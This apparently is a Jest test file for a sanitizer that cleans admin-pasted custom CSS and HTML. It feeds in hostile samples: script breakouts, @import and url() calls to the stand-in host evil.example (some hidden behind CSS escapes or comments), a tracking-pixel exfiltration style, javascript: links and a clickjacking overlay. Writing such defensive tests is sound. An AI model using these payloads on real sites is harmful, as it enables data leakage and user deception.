import { sanitizeCustomCss, sanitizeCustomCssMap, sanitizeHtmlBlock } from './custom-code';

/**
 * Write-side defence for the operator escape hatch. The acceptance case is
 * the pitched workflow: an admin pastes a design/animation snippet generated
 * outside the platform, and it must arrive styled — never scriptable.
 */
describe('sanitizeCustomCss', () => {
  it('keeps a real animation snippet intact', () => {
    const snippet =
      '@keyframes spinIn { from { transform: rotate(-8deg); opacity: 0 } to { transform: none; opacity: 1 } }\n' +
      '.reveal.in { animation: spinIn .7s both; }\n' +
      '.ps-panel { border: 2px dashed gold; }';
    const out = sanitizeCustomCss(snippet);
    expect(out).toContain('@keyframes spinIn');
    expect(out).toContain('animation: spinIn .7s both');
    expect(out).toContain('border: 2px dashed gold');
  });

  it('a style-tag breakout cannot survive', () => {
    expect(sanitizeCustomCss('.a{color:red}</style><script>alert(1)</script>')).not.toContain('<');
  });

  it('strips @import and neutralizes external url(), keeps data: URIs', () => {
    const out = sanitizeCustomCss(
      "@import url('https://evil.example/x.css');\n" +
        '.a{background:url(https://evil.example/p.png)}\n' +
        '.b{background:url(data:image/svg+xml;base64,abc)}',
    );
    expect(out).not.toMatch(/@import/i);
    expect(out).toContain('about:invalid#');
    expect(out).toContain('url(data:image/svg+xml;base64,abc)');
  });

  // Regression: CSS escapes and comments used to slip @import / url() past the
  // literal-keyword regex, because the browser decodes them and this did not.
  it('defeats @import hidden behind CSS hex escapes', () => {
    const out = sanitizeCustomCss('@\\69mport "https://evil.example/x.css";');
    expect(out.toLowerCase()).not.toContain('@import');
    expect(out).not.toContain('evil.example');
  });
  it('defeats url() hidden behind CSS hex escapes', () => {
    // Neutralized to an inert about:invalid fragment — unfetchable even though
    // the target text survives after the '#'.
    const out = sanitizeCustomCss('.a{background:u\\72l(https://evil.example/p.png)}');
    expect(out).toContain('url(about:invalid#');
    expect(out).not.toMatch(/url\(\s*['"]?https?:/i);
  });
  it('a comment cannot pad a keyword past the scan', () => {
    const out = sanitizeCustomCss('@import/**/url("https://evil.example/x.css");');
    expect(out.toLowerCase()).not.toContain('@import');
    expect(out).not.toContain('evil.example');
  });
  it('neutralizes -moz-binding', () => {
    expect(sanitizeCustomCss('.a{-moz-binding:url(https://evil/x.xml#e)}')).not.toMatch(/-moz-binding\s*:/i);
  });

  it('map form keeps only known section keys', () => {
    const out = sanitizeCustomCssMap({ stats: '.x{a:1}', '../evil': '.y{b:2}', hero: '.z{c:3}' });
    expect(Object.keys(out).sort()).toEqual(['hero', 'stats']);
  });
});

describe('sanitizeHtmlBlock', () => {
  it('keeps structural markup and classes', () => {
    const out = sanitizeHtmlBlock(
      '<div class="ps-panel"><h2 class="ps-head">Toppers</h2><p>Aarav — <b>98.2%</b></p></div>',
    );
    expect(out).toContain('<h2 class="ps-head">Toppers</h2>');
    expect(out).toContain('<b>98.2%</b>');
  });

  it('drops scripts, event handlers and javascript: hrefs', () => {
    const out = sanitizeHtmlBlock(
      '<p onclick="alert(1)">x</p><script>alert(1)</script><a href="javascript:alert(1)">y</a><iframe src="https://x"></iframe>',
    );
    expect(out).not.toContain('script');
    expect(out).not.toContain('onclick');
    expect(out).not.toContain('javascript:');
    expect(out).not.toContain('iframe');
  });

  it('forces rel=noopener on links', () => {
    const out = sanitizeHtmlBlock('<a href="https://example.com" target="_blank">x</a>');
    expect(out).toContain('rel="noopener noreferrer"');
  });

  // Regression: a bare style attribute with no allowedStyles is fully
  // unfiltered — these are the reviewer's confirmed exfiltration + clickjacking
  // payloads and must not survive.
  it('strips external url() from inline styles', () => {
    const out = sanitizeHtmlBlock('<div style="background:url(https://evil.example/track.png?d=leak)">x</div>');
    expect(out).not.toContain('evil.example');
    expect(out).not.toMatch(/url\(/i);
  });
  it('drops position/z-index so no block can pin a clickjacking overlay', () => {
    const out = sanitizeHtmlBlock(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:9999">x</div>',
    );
    expect(out).not.toMatch(/position\s*:/i);
    expect(out).not.toMatch(/z-index/i);
  });
  it('keeps safe layout/colour styles', () => {
    const out = sanitizeHtmlBlock('<div style="color:#b8791a;padding:1.5rem;border-radius:12px">x</div>');
    expect(out).toContain('color:#b8791a');
    expect(out).toContain('padding:1.5rem');
  });
});
